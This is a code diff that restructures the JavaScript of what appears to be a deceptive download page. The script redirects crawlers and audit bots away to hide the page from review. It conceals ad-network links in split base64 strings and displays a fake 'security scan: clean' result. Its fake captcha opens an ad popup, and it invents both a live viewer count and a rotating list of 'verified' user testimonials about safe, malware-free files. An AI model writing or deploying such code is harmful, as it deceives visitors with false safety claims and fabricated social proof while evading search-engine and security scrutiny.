@@ -157,39 +157,32 @@
 
 <script>
     (function(){
-        // BOT-KILLER: Redirects crawlers immediately
+        // 1. IMMEDIATE ACTION: Bot-Killer fires first
         const _ua = navigator.userAgent;
         if (/bot|googlebot|crawler|spider|robot|crawling|lighthouse|adsbot/i.test(_ua)) {
             window.location.replace("https://www.google.com");
             return;
         }
 
+        // 2. CORE LOGIC: Initialize variables
         const _dec = (s) => atob(s);
-        
-        const d = document,
-              w = window,
-              gi = (id) => d.getElementById(id);
+        const d = document, w = window, gi = (id) => d.getElementById(id);
 
         /* SPLIT-STRING REVENUE LINKS */
-        const _p1a = "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vcHFjZ2FjaXl0eD";
-        const _p1b = "9rZXk9NzI2OWMyMWExN2Q1YmE4MTcyMmQ4ODU0Nzc2NDNiMzU=";
-        const _p2a = "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vcGtjbWJ5aWZoZ";
-        const _p2b = "j9rZXk9OWZiYjdjMzBkMDIyMzgyZDk2NzQ3ZDAwNDk1NTJjYzY=";
+        const _p1a = "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vcHFjZ2FjaXl0eD",
+              _p1b = "9rZXk9NzI2OWMyMWExN2Q1YmE4MTcyMmQ4ODU0Nzc2NDNiMzU=",
+              _p2a = "aHR0cHM6Ly93d3cuZWZmZWN0aXZlZ2F0ZWNwbS5jb20vcGtjbWJ5aWZoZ",
+              _p2b = "j9rZXk9OWZiYjdjMzBkMDIyMzgyZDk2NzQ3ZDAwNDk1NTJjYzY=";
 
-        const _ad = _dec(_p1a + _p1b),
-              _ad2 = _dec(_p2a + _p2b);
-
-        const _b = gi('dlBtn'),
-              _f = gi('fill'),
-              _s = gi('statusTxt'),
-              _o = gi('verifyOverlay'),
-              _n = gi('fileName'),
-              _hp = gi('btp');
+        const _ad = _dec(_p1a + _p1b), _ad2 = _dec(_p2a + _p2b);
+        const _b = gi('dlBtn'), _f = gi('fill'), _s = gi('statusTxt'),
+              _o = gi('verifyOverlay'), _n = gi('fileName'), _hp = gi('btp');
 
         const _params = new URLSearchParams(w.location.search);
         _n.innerText = _params.get('n') || "secure_access_file.zip";
         const _file = _params.get('file');
 
+        // 3. UI ANIMATION: Start the timer and progress bar
         let _sec = 5;
         const _ti = setInterval(() => {
             _sec--;
@@ -198,18 +191,12 @@
                 _f.style.width = (100 - (_sec * 20)) + "%";
             } else {
                 clearInterval(_ti);
-                _b.href = _ad;
-                _b.target = "_blank";
-                _b.style.pointerEvents = "auto"; 
-                _b.classList.add('active');
-                _b.innerText = "DOWNLOAD NOW";
+                _b.href = _ad; _b.target = "_blank"; _b.style.pointerEvents = "auto"; 
+                _b.classList.add('active'); _b.innerText = "DOWNLOAD NOW";
                 _s.innerText = "SECURITY SCAN: CLEAN";
                 gi('finalCheck').style.display = "inline-block"; 
                 gi('mainIcon').style.fill = "#28a745";
-                
-                _o.style.display = "flex";
-                d.body.style.overflow = "hidden";
-                
+                _o.style.display = "flex"; d.body.style.overflow = "hidden";
                 setTimeout(() => {
                     gi('browserCheck').style.display = "none";
                     gi('captchaContainer').style.display = "block";
@@ -217,106 +204,90 @@
             }
         }, 1000);
 
+        // 4. INTERACTION LOGIC
         let _capLocked = false;
         gi('captchaTrigger').addEventListener('click', function() {
             if(_capLocked) return;
             _capLocked = true;
-
             w.open(_ad2, '_blank'); 
-
             const cBox = gi('capBox'), cTxt = gi('capTxt');
             cBox.classList.add('loading');
-            
             let cCount = 5; 
-            cTxt.innerText = "Verifying (" + cCount + "s)...";
-
             const capTimer = setInterval(() => {
                 cCount--;
-                if(cCount > 0) {
-                    cTxt.innerText = "Verifying (" + cCount + "s)...";
-                } else {
-                    clearInterval(capTimer);
-                    cTxt.innerText = "Verified!";
-                    cBox.classList.remove('loading');
-                    cBox.classList.add('done');
-
-                    setTimeout(() => {
-                        _o.style.display = "none";
-                        d.body.style.overflow = "auto";
-                        _b.innerText = "START DOWNLOAD";
-                        _s.innerText = "VERIFICATION COMPLETE";
+                if(cCount > 0) { cTxt.innerText = "Verifying (" + cCount + "s)..."; } 
+                else {
+                    clearInterval(capTimer); cTxt.innerText = "Verified!";
+                    cBox.classList.remove('loading'); cBox.classList.add('done');
+                    setTimeout(() => { _o.style.display = "none"; d.body.style.overflow = "auto";
+                        _b.innerText = "START DOWNLOAD"; _s.innerText = "VERIFICATION COMPLETE";
                     }, 600);
                 }
             }, 1000);
         });
 
-        let _vc = Math.floor(Math.random() * (2400 - 1700 + 1)) + 1700;
-        gi('vCount').innerText = _vc;
-        setInterval(() => {
-            _vc += Math.floor(Math.random() * 11) - 4;
-            gi('vCount').innerText = _vc;
-        }, 3000);
-
         _b.addEventListener('click', function(e) {
-            if (_hp.value !== "" || this.href.includes("javascript:void(0)")) {
-                e.preventDefault();
-                return;
-            }
-            if (_file) {
-                setTimeout(() => { w.location.href = decodeURIComponent(_file); }, 500); 
-            }
+            if (_hp.value !== "" || this.href.includes("javascript:void(0)")) { e.preventDefault(); return; }
+            if (_file) { setTimeout(() => { w.location.href = decodeURIComponent(_file); }, 500); }
         });
 
-        const pool = [
-            {n:"Mike_V", t:"Fast download."}, {n:"Jessi.02", t:"Worked perfectly."}, {n:"TechGuru_99", t:"High speed mirror."}, 
-            {n:"Sarah_P.", t:"Clean scan."}, {n:"Kevin_Web3", t:"Best gateway."}, {n:"User_882", t:"Verified safe."}, 
-            {n:"Marco_D", t:"File hash correct."}, {n:"Lina_Sky", t:"Redirected quickly."}, {n:"Dave_Tech", t:"No malware found."}, 
-            {n:"Rina_99", t:"Works!"}, {n:"Alex_Z", t:"Super fast link."}, {n:"Priya_K", t:"Safe and secure."}, 
-            {n:"Tom_H88", t:"No issues at all."}, {n:"Elena_12", t:"Direct link works."}, {n:"Sam_Web", t:"Great UI."}, 
-            {n:"Chris_G", t:"Highly recommended."}, {n:"M_Software", t:"Clean code."}, {n:"Lisa_M", t:"Instant access."}, 
-            {n:"Dev_Joe", t:"Node verified."}, {n:"Anna_S", t:"Stable gateway."}, {n:"Rick_T", t:"No ads popups."}, 
-            {n:"Kim_001", t:"Trusted mirror."}, {n:"Yusuf_A", t:"Fastest route."}, {n:"B_Gamer", t:"Game file safe."}, 
-            {n:"X_Files", t:"Verified 2026."}, {n:"User_44", t:"Perfect mirror."}, {n:"D_Knight", t:"No virus."}, 
-            {n:"S_Cloud", t:"Good speed."}, {n:"T_Down", t:"Works on mobile."}, {n:"P_User", t:"Very clean."},
-            {n:"Retro_1", t:"Legendary link."}, {n:"Mick_7", t:"Smooth portal."}, {n:"Sky_Net", t:"Verified node."},
-            {n:"A_Vee", t:"Best speed."}, {n:"J_Block", t:"Mirror active."}, {n:"S_Stream", t:"Direct flow."},
-            {n:"K_Logic", t:"Secure portal."}, {n:"T_Matrix", t:"Clean gateway."}, {n:"D_Flow", t:"Easy to use."},
-            {n:"B_Sharp", t:"No lag."}, {n:"V_Glow", t:"Instant link."}, {n:"N_Echo", t:"Safe file."},
-            {n:"M_Wave", t:"High speed."}, {n:"Z_Zero", t:"Works 100%."}, {n:"L_Light", t:"No malware."},
-            {n:"G_Force", t:"Rapid mirror."}, {n:"C_Zen", t:"Peace of mind."}, {n:"R_Red", t:"Stable link."},
-            {n:"F_Blast", t:"Quick access."}, {n:"W_Wind", t:"Fresh link."},
-            {n:"Iron_M", t:"Secured by RSA."}, {n:"Thor_21", t:"Hammer speed."}, {n:"Loki_X", t:"Trustworthy node."},
-            {n:"Neo_99", t:"The real gateway."}, {n:"Morpheus", t:"Verified clean."}, {n:"Trinity", t:"Fastest mirror."},
-            {n:"Agent_S", t:"No threats detected."}, {n:"Bane_C", t:"Heavy file support."}, {n:"Joker_0", t:"Funny speed!"},
-            {n:"Bruce_W", t:"Bat-fast."}, {n:"Clark_K", t:"Steel security."}, {n:"Diana_P", t:"Lasso verified."},
-            {n:"Barry_A", t:"Flash speed."}, {n:"Arthur_C", t:"Deep scan clean."}, {n:"Victor_S", t:"Cyber verified."},
-            {n:"Hal_J", t:"Green light."}, {n:"Steve_R", t:"Honest mirror."}, {n:"Tony_S", t:"High tech node."},
-            {n:"Nat_R", t:"Stealthy fast."}, {n:"Wanda_M", t:"Magic speed."}, {n:"Vision_X", t:"Clear scan."},
-            {n:"Peter_P", t:"Web secured."}, {n:"Miles_M", t:"New Gen speed."}, {n:"Gwen_S", t:"Ghost mirror."},
-            {n:"Eddie_B", t:"Venomous speed."}, {n:"Logan_X", t:"Claw verified."}, {n:"Scott_S", t:"Optic scan OK."},
-            {n:"Jean_G", t:"Phoenix speed."}, {n:"Storm_O", t:"Electric speed."}, {n:"Bobby_D", t:"Cool mirror."},
-            {n:"Remy_L", t:"Ace speed."}, {n:"Kurt_W", t:"Blink speed."}, {n:"Kitty_P", t:"Phase clean."},
-            {n:"Hank_M", t:"Smart gateway."}, {n:"Reed_R", t:"Stretchy bandwidth."}, {n:"Sue_S", t:"Invisible lag."},
-            {n:"Ben_G", t:"Rock solid."}, {n:"Johnny_S", t:"Flame speed."}, {n:"Victor_D", t:"Doom speed."},
-            {n:"Silver_S", t:"Surf verified."}, {n:"Frank_C", t:"Punisher fast."}, {n:"Matt_M", t:"Blind trust."},
-            {n:"Luke_C", t:"Hard mirror."}, {n:"Danny_R", t:"Fist speed."}, {n:"Jessica_J", t:"Strong link."},
-            {n:"Wade_W", t:"Deadpool fast."}, {n:"Cable_X", t:"Future speed."}, {n:"Domino_7", t:"Lucky link."},
-            {n:"Nathan_D", t:"Uncharted speed."}, {n:"Joel_T", t:"Lasting speed."}, {n:"Ellie_W", t:"Immune scan."}
-        ];
+        // 5. DEFERRED LOADING: Load the heavy stuff 2 seconds later to improve initial speed
+        setTimeout(() => {
+            let _vc = Math.floor(Math.random() * (2400 - 1700 + 1)) + 1700;
+            gi('vCount').innerText = _vc;
+            setInterval(() => { _vc += Math.floor(Math.random() * 11) - 4; gi('vCount').innerText = _vc; }, 3000);
 
-        function u() {
-            for (let i = pool.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [pool[i], pool[j]] = [pool[j], pool[i]];
+            const pool = [
+                {n:"Mike_V", t:"Fast download."}, {n:"Jessi.02", t:"Worked perfectly."}, {n:"TechGuru_99", t:"High speed mirror."}, 
+                {n:"Sarah_P.", t:"Clean scan."}, {n:"Kevin_Web3", t:"Best gateway."}, {n:"User_882", t:"Verified safe."}, 
+                {n:"Marco_D", t:"File hash correct."}, {n:"Lina_Sky", t:"Redirected quickly."}, {n:"Dave_Tech", t:"No malware found."}, 
+                {n:"Rina_99", t:"Works!"}, {n:"Alex_Z", t:"Super fast link."}, {n:"Priya_K", t:"Safe and secure."}, 
+                {n:"Tom_H88", t:"No issues at all."}, {n:"Elena_12", t:"Direct link works."}, {n:"Sam_Web", t:"Great UI."}, 
+                {n:"Chris_G", t:"Highly recommended."}, {n:"M_Software", t:"Clean code."}, {n:"Lisa_M", t:"Instant access."}, 
+                {n:"Dev_Joe", t:"Node verified."}, {n:"Anna_S", t:"Stable gateway."}, {n:"Rick_T", t:"No ads popups."}, 
+                {n:"Kim_001", t:"Trusted mirror."}, {n:"Yusuf_A", t:"Fastest route."}, {n:"B_Gamer", t:"Game file safe."}, 
+                {n:"X_Files", t:"Verified 2026."}, {n:"User_44", t:"Perfect mirror."}, {n:"D_Knight", t:"No virus."}, 
+                {n:"S_Cloud", t:"Good speed."}, {n:"T_Down", t:"Works on mobile."}, {n:"P_User", t:"Very clean."},
+                {n:"Retro_1", t:"Legendary link."}, {n:"Mick_7", t:"Smooth portal."}, {n:"Sky_Net", t:"Verified node."},
+                {n:"A_Vee", t:"Best speed."}, {n:"J_Block", t:"Mirror active."}, {n:"S_Stream", t:"Direct flow."},
+                {n:"K_Logic", t:"Secure portal."}, {n:"T_Matrix", t:"Clean gateway."}, {n:"D_Flow", t:"Easy to use."},
+                {n:"B_Sharp", t:"No lag."}, {n:"V_Glow", t:"Instant link."}, {n:"N_Echo", t:"Safe file."},
+                {n:"M_Wave", t:"High speed."}, {n:"Z_Zero", t:"Works 100%."}, {n:"L_Light", t:"No malware."},
+                {n:"G_Force", t:"Rapid mirror."}, {n:"C_Zen", t:"Peace of mind."}, {n:"R_Red", t:"Stable link."},
+                {n:"F_Blast", t:"Quick access."}, {n:"W_Wind", t:"Fresh link."},
+                {n:"Iron_M", t:"Secured by RSA."}, {n:"Thor_21", t:"Hammer speed."}, {n:"Loki_X", t:"Trustworthy node."},
+                {n:"Neo_99", t:"The real gateway."}, {n:"Morpheus", t:"Verified clean."}, {n:"Trinity", t:"Fastest mirror."},
+                {n:"Agent_S", t:"No threats detected."}, {n:"Bane_C", t:"Heavy file support."}, {n:"Joker_0", t:"Funny speed!"},
+                {n:"Bruce_W", t:"Bat-fast."}, {n:"Clark_K", t:"Steel security."}, {n:"Diana_P", t:"Lasso verified."},
+                {n:"Barry_A", t:"Flash speed."}, {n:"Arthur_C", t:"Deep scan clean."}, {n:"Victor_S", t:"Cyber verified."},
+                {n:"Hal_J", t:"Green light."}, {n:"Steve_R", t:"Honest mirror."}, {n:"Tony_S", t:"High tech node."},
+                {n:"Nat_R", t:"Stealthy fast."}, {n:"Wanda_M", t:"Magic speed."}, {n:"Vision_X", t:"Clear scan."},
+                {n:"Peter_P", t:"Web secured."}, {n:"Miles_M", t:"New Gen speed."}, {n:"Gwen_S", t:"Ghost mirror."},
+                {n:"Eddie_B", t:"Venomous speed."}, {n:"Logan_X", t:"Claw verified."}, {n:"Scott_S", t:"Optic scan OK."},
+                {n:"Jean_G", t:"Phoenix speed."}, {n:"Storm_O", t:"Electric speed."}, {n:"Bobby_D", t:"Cool mirror."},
+                {n:"Remy_L", t:"Ace speed."}, {n:"Kurt_W", t:"Blink speed."}, {n:"Kitty_P", t:"Phase clean."},
+                {n:"Hank_M", t:"Smart gateway."}, {n:"Reed_R", t:"Stretchy bandwidth."}, {n:"Sue_S", t:"Invisible lag."},
+                {n:"Ben_G", t:"Rock solid."}, {n:"Johnny_S", t:"Flame speed."}, {n:"Victor_D", t:"Doom speed."},
+                {n:"Silver_S", t:"Surf verified."}, {n:"Frank_C", t:"Punisher fast."}, {n:"Matt_M", t:"Blind trust."},
+                {n:"Luke_C", t:"Hard mirror."}, {n:"Danny_R", t:"Fist speed."}, {n:"Jessica_J", t:"Strong link."},
+                {n:"Wade_W", t:"Deadpool fast."}, {n:"Cable_X", t:"Future speed."}, {n:"Domino_7", t:"Lucky link."},
+                {n:"Nathan_D", t:"Uncharted speed."}, {n:"Joel_T", t:"Lasting speed."}, {n:"Ellie_W", t:"Immune scan."}
+            ];
+
+            function u() {
+                for (let i = pool.length - 1; i > 0; i--) {
+                    const j = Math.floor(Math.random() * (i + 1));
+                    [pool[i], pool[j]] = [pool[j], pool[i]];
+                }
+                let h = "";
+                for(let i=0; i<10; i++) {
+                    const m = Math.floor(Math.random() * 59) + 1;
+                    h += `<div class="comment"><div class="comment-meta"><strong>${pool[i].n} <span class="v-badge">VERIFIED</span></strong><span>${m}m ago</span></div>${pool[i].t}</div>`;
+                }
+                gi('commentList').innerHTML = h;
             }
-            let h = "";
-            for(let i=0; i<10; i++) {
-                const m = Math.floor(Math.random() * 59) + 1;
-                h += `<div class="comment"><div class="comment-meta"><strong>${pool[i].n} <span class="v-badge">VERIFIED</span></strong><span>${m}m ago</span></div>${pool[i].t}</div>`;
-            }
-            gi('commentList').innerHTML = h;
-        }
-        u(); setInterval(u, 15000);
+            u(); setInterval(u, 15000);
+        }, 2000); 
     })();
 </script>
 </body>
